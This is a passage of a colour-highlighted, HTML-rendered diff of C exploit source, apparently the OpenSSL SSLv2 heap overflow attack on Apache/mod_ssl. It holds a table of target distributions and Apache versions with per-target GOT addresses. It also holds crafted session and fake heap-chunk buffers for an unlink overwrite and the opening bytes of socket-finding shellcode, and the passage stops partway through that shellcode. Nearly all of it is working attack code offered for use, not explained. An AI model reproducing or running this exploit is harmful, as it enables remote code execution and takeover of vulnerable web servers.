+                <span style="color:#ff0044;font-weight:400">0x80b0938</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08161c16</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.26-snc)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x8161c14</span><br>
+                },<br>
+                {<br>
+                <br>
+                <span style="color:#3ad900;font-weight:400">"Redhat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.26&nbsp;w/PHP)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08269950</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Redhat&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.26&nbsp;w/PHP)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08269988</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.2-Update&nbsp;(apache-1.3.27-1.7.2)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086af9</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.3&nbsp;(apache-1.3.23-11)1"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808528c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.3&nbsp;(apache-1.3.23-11)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0808525f</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;7.3&nbsp;(apache-1.3.27)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080862e4</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.27)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x08084c1c</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;8.0-second&nbsp;(apache-1.3.27)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x0808151e</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"RedHat&nbsp;Linux&nbsp;8.0&nbsp;(apache-2.0.40)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x08092fa4</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;4.0&nbsp;(apache-1.3.6)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08088130</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.9)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080a7fc0</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x083d37fc</span><br>
+                },<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Slackware&nbsp;7.0&nbsp;&nbsp;(apache-1.3.26)2"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x083d2232</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.12)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080a86a4</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.20)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080ae67c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;8.1&nbsp;(apache-1.3.24)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080b0c60</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;8.1&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080b2100</span><br>
+                },<br>
+                <br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;8.1-stable&nbsp;(apache-1.3.26)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080b0c60</span><br>
+                },<br>
+                {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"Slackware&nbsp;Linux&nbsp;(apache-1.3.27)"</span>,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff0044;font-weight:400">0x080b1a3a</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;7.0&nbsp;(apache-1.3.12)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x0809f54c</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;7.1&nbsp;(apache-1.3.17)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08099984</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;7.2&nbsp;(apache-1.3.19)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08099ec8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;7.3&nbsp;(apache-1.3.20)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08099da8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.23)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x08086168</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SUSE&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.23-120)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080861c8</span><br>
+                },<br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"SuSE&nbsp;Linux&nbsp;8.0&nbsp;(apache-1.3.23-137)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0x080861c8</span><br>
+                },<br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;this&nbsp;one&nbsp;unchecked&nbsp;cause&nbsp;require&nbsp;differend&nbsp;shellcode&nbsp;*/</span><br>
+                {<br>
+                <span style="color:#3ad900;font-weight:400">"Yellow&nbsp;Dog&nbsp;Linux/PPC&nbsp;2.3&nbsp;(apache-1.3.22-6.2.3a)"</span>,<br>
+                <span style="color:#ff0044;font-weight:400">0xfd42630</span><br>
+                },<br>
+                <br>
+                };<br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">extern</span>&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;errno;<br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;cipher;<br>
+                <span style="color:#7f0044;font-weight:400">int</span>&nbsp;ciphers;<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;the&nbsp;offset&nbsp;of&nbsp;the&nbsp;local&nbsp;port&nbsp;from&nbsp;be&nbsp;beginning&nbsp;of&nbsp;the&nbsp;overwrite&nbsp;next&nbsp;chunk&nbsp;buffer&nbsp;*/</span><br>
+                <span style="color:#7f0044;font-weight:700">#define&nbsp;FINDSCKPORTOFS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;208&nbsp;+&nbsp;12&nbsp;+&nbsp;46</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;overwrite_session_id_length[]&nbsp;=<br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;master&nbsp;key&nbsp;length;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;char&nbsp;master&nbsp;key[SSL&nbsp;MAX&nbsp;MASTER&nbsp;KEY&nbsp;LENGTH]; */</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x70\x00\x00\x00"</span>; <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;int&nbsp;session&nbsp;id&nbsp;length;&nbsp;*/</span><br>
+                <br>
+                <span style="color:#7f0044;font-weight:400">unsigned</span>&nbsp;<span style="color:#7f0044;font-weight:400">char</span>&nbsp;overwrite_next_chunk[]&nbsp;=<br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;master&nbsp;key&nbsp;length;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;char&nbsp;master&nbsp;key[SSL&nbsp;MAX&nbsp;MASTER&nbsp;KEY&nbsp;LENGTH]; */</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;int&nbsp;session&nbsp;id&nbsp;length;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;char&nbsp;session&nbsp;id[SSL&nbsp;MAX&nbsp;SSL&nbsp;SESSION&nbsp;ID&nbsp;LENGTH];&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;int&nbsp;sid&nbsp;ctx&nbsp;length;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;char&nbsp;sid&nbsp;ctx[SSL&nbsp;MAX&nbsp;SID&nbsp;CTX&nbsp;LENGTH];&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;not&nbsp;resumable;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;struct&nbsp;sess&nbsp;cert&nbsp;st&nbsp;*sess&nbsp;cert;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;X509&nbsp;*peer;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;long&nbsp;verify&nbsp;result;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x01\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;references;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;timeout;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;time&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;compress&nbsp;meth;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;SSL&nbsp;CIPHER&nbsp;*cipher;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;unsigned&nbsp;long&nbsp;cipher&nbsp;id;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;STACK&nbsp;OF(SSL&nbsp;CIPHER)&nbsp;*ciphers;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;CRYPTO&nbsp;EX&nbsp;DATA&nbsp;ex&nbsp;data;&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"AAAAAAAA"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;struct&nbsp;ssl&nbsp;session&nbsp;st&nbsp;*prev,*next;&nbsp;*/</span><br>
+                <br>
+                <span style="color:#3ad900;font-weight:400">"\x00\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;Size&nbsp;of&nbsp;previous&nbsp;chunk&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x11\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;Size&nbsp;of&nbsp;chunk,&nbsp;in&nbsp;bytes&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"fdfd"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;Forward&nbsp;and&nbsp;back&nbsp;pointers&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"bkbk"</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x10\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;Size&nbsp;of&nbsp;previous&nbsp;chunk&nbsp;*/</span><br>
+                <span style="color:#3ad900;font-weight:400">"\x10\x00\x00\x00"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;Size&nbsp;of&nbsp;chunk,&nbsp;PREV&nbsp;INUSE&nbsp;is&nbsp;set&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;shellcode&nbsp;start&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xeb\x0a\x90\x90"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;jump&nbsp;10&nbsp;bytes&nbsp;ahead,&nbsp;land&nbsp;at&nbsp;shellcode&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x90\x90\x90\x90"</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x90\x90\x90\x90"</span> <span style="color:#0088ff;font-weight:400">/*&nbsp;this&nbsp;is&nbsp;overwritten&nbsp;with&nbsp;FD&nbsp;by&nbsp;the&nbsp;unlink&nbsp;macro&nbsp;*/</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">/*&nbsp;72&nbsp;bytes&nbsp;findsckcode&nbsp;by&nbsp;LSD-pl&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xdb"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%ebx,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\xe7"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%esp,%edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x8d\x77\x10"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;leal&nbsp;&nbsp;&nbsp;&nbsp;0x10(%edi),%esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\x77\x04"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%esi,0x4(%edi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x8d\x4f\x20"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;leal&nbsp;&nbsp;&nbsp;&nbsp;0x20(%edi),%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\x4f\x08"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%ecx,0x8(%edi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb3\x10"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x10,%bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\x19"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%ebx,(%ecx)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc9"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%ecx,%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb1\xff"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0xff,%cl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\x0f"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%ecx,(%edi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x51"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;pushl&nbsp;&nbsp;&nbsp;%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xc0"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%eax,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb0\x66"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x66,%al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xb3\x07"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movb&nbsp;&nbsp;&nbsp;&nbsp;$0x07,%bl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x89\xf9"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movl&nbsp;&nbsp;&nbsp;&nbsp;%edi,%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\xcd\x80"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x59"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;popl&nbsp;&nbsp;&nbsp;&nbsp;%ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x31\xdb"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;xorl&nbsp;&nbsp;&nbsp;&nbsp;%ebx,%ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x39\xd8"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;cmpl&nbsp;&nbsp;&nbsp;&nbsp;%ebx,%eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x75\x0a"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;findsckcode+54&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x66\xb8\x12\x34"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;movw&nbsp;&nbsp;&nbsp;&nbsp;$0x1234,%bx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#3ad900;font-weight:400">"\x66\x39\x46\x02"</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">/*&nbsp;cmpw&nbsp;&nbsp;&nbsp;&nbsp;%bx,0x2(%esi)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span><br>
